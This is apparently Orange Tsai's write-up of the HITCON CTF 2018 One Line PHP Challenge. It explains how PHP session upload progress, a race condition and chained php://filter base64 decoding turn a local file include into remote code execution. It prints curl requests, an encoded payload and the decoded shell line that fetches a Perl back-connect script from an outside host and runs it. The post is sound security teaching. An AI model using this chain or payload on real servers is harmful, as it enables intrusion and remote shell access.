---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/
title: "HITCON CTF 2018 - One Line PHP Challenge | Orange Tsai"
author: "Orange Tsai"
published: 2018-10-23T16:00:00.000Z
description: "In every year’s HITCON CTF, I will prepare at least one PHP exploit challenge which the source code is very straightforward, short and easy to review but hard to exploit! I have put all my challenges"
---

* * *

In every year’s HITCON CTF, I will prepare at least one PHP exploit challenge which the source code is very straightforward, short and easy to review but hard to exploit! I have put all my challenges in this [GitHub repo](https://github.com/orangetw/My-CTF-Web-Challenges) you can check, and here are some lists :P

- 2017 [Baby^H Master PHP 2017](https://github.com/orangetw/My-CTF-Web-Challenges#babyh-master-php-2017) (0/1541 solved)
  - `Phar` protocol to `deserialize` malicious object
  - Hardcode anonymous function name `\x00lambda_%d`
  - Break shared VARIABLE state in Apache Pre-fork mode
- 2017 [BabyFirst Revenge v2](https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge-v2) (8/1541 solved)
  - Command Injection in **4** bytes
- 2016 [BabyTrick](https://github.com/orangetw/My-CTF-Web-Challenges#babytrick) (24/1024 solved)
  - [Create an Unexpected Object and Don’t Invoke \_\_wakeup() in Deserialization](https://bugs.php.net/bug.php?id=72663)
  - MySQL UTF-8 collation - `SELECT 'Ä'='a'` is True
- 2015 [Babyfirst](https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst) (33/969 solved)
  - Multi-line match in PHP regular expression
  - Command injection without symbols
- 2015 [Use-After-FLEE](https://github.com/orangetw/My-CTF-Web-Challenges#use-after-flee) (1/969 solved)
  - Bypass disable\_functions and open\_basedir
  - Write PHP use-after-free exploit
  - Bypass full protection (DEP / ASLR / PIE / FULL RELRO)
  - [Yet Another Use After Free Vulnerability in unserialize() with SplDoublyLinkedList](https://github.com/80vul/phpcodz/blob/master/research/pch-034.md)

This year, I designed another one and it’s the shortest one among all my challenges - One Line PHP Challenge!(There is also another PHP code review challenges called [Baby Cake](https://github.com/orangetw/My-CTF-Web-Challenges#baby-cake) may be you will be interested!) It’s only 3 teams(among all 1816 teams)solve that during the competition. This challenge demonstrates how PHP can be squeezed. The initial idea is from [@chtg57](https://twitter.com/chtg57)‘s [PHP bug report](https://bugs.php.net/bug.php?id=72681). Since `session.upload_progress` is default enabled in PHP so that you can control partial content in PHP SESSION files! Start from this feature, I designed this challenge!

The challenge is simple, just one line and tell you it is running under default installation of Ubuntu 18.04 + PHP7.2 + Apache. Here is whole the source code:

![](https://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/e8d96ba6490e70eb-01.png)

With the upload progress feature, although you can control the partial content in SESSION file, there are still several parts you need to defeat!

## [Inclusion Tragedy](https://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/\#Inclusion-Tragedy "Inclusion Tragedy") Inclusion Tragedy

In modern PHP configuration, the `allow_url_include` is always `Off` so the `RFI(Remote file inclusion)` is impossible, and due to the harden of new version’s Apache and PHP, it can not also include the common path in LFI exploiting such as `/proc/self/environs` or `/var/log/apache2/access.log`.

There is also no place can leak the PHP upload temporary filename so the [LFI WITH PHPINFO() ASSISTANCE](https://www.insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf) is also impossible :(

## [Session Tragedy](https://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/\#Session-Tragedy "Session Tragedy") Session Tragedy

The PHP check the value `session.auto_start` or function `session_start()` to know whether it need to process session on current request or not. Unfortunately, the default value of `session.auto_start` is `Off`. However, it’s interesting that if you provide the `PHP_SESSION_UPLOAD_PROGRESS` in multipart POST data. The PHP will enable the session for you :P

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>``` | ```<br>$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange'<br>$ ls -a /var/lib/php/sessions/<br>. ..<br>$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -d 'PHP_SESSION_UPLOAD_PROGRESS=blahblahblah'<br>$ ls -a /var/lib/php/sessions/<br>. ..<br>$ curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -F 'PHP_SESSION_UPLOAD_PROGRESS=blahblahblah'  -F 'file=@/etc/passwd'<br>$ ls -a /var/lib/php/sessions/<br>. .. sess_iamorange<br>``` |

## [Cleanup Tragedy](https://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/\#Cleanup-Tragedy "Cleanup Tragedy") Cleanup Tragedy

Although most tutorials on the Internet recommends you to set `session.upload_progress.cleanup` to `Off` for debugging purpose. The default `session.upload_progress.cleanup` in PHP is still `On`. It means your upload progress in the session will be cleaned as soon as possible!

Here we use race condition to catch our data! (Another idea is uploading a large file to keep the progress)

## [Prefix Tragedy](https://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/\#Prefix-Tragedy "Prefix Tragedy") Prefix Tragedy

OK, now we can control some data in remote server, but the last tragedy is the prefix. Due to the default setting of `session.upload_progress.prefix`, our SESSION file will start with a annoying prefix `upload_progress_`! Such as:

![](https://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/acfdf82f194b711a-02.png)

In order to match the `@<?php`. Here we combine multiple PHP stream filter to bypass that annoying prefix. Such as:

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>php://filter/[FILTER_A]/.../resource=/var/lib/php/session/sess...<br>``` |

In PHP, the `base64` will ignore invalid characters. So we combine multiple `convert.base64-decode` filter to that, for the payload `VVVSM0wyTkhhSGRKUjBKcVpGaEtjMGxIT1hsWlZ6VnVXbE0xTUdSNU9UTk1Na3BxVEc1Q2MyWklRbXhqYlhkblRGZEJOMUI2TkhaTWVUaDJUSGs0ZGt4NU9IWk1lVGgy`. The SESSION file looks like:

![](https://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/b881c032b8eb0dbe-03.png)

_P.S. We add `ZZ` as padding to fit the previous garbage_

After the the first `convert.base64-decode` the payload will look like:

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>��hi�k� ޲�YUUR3L2NHaHdJR0JqZFhKc0lHOXlZVzVuWlM1MGR5OTNMMkpqTG5Cc2ZIQmxjbXdnTFdBN1B6NHZMeTh2THk4dkx5OHZMeTh2<br>``` |

The second times, PHP will decode the `hikYUU...` as:

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>�) QDw/cGhwIGBjdXJsIG9yYW5nZS50dy93L2JjLnBsfHBlcmwgLWA7Pz4vLy8vLy8vLy8vLy8v<br>``` |

The third `convert.base64-decode`, it becomes to our shell payload:

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>@<?php `curl orange.tw/w/bc.pl|perl -`;?>/////////////<br>``` |

OK, by chaining above techniques(session upload progress + race condition + PHP wrappers), we can get the shell back! Please [check here](https://github.com/orangetw/My-CTF-Web-Challenges/blob/master/hitcon-ctf-2018/one-line-php-challenge/exp_for_php.py) for the final exploit!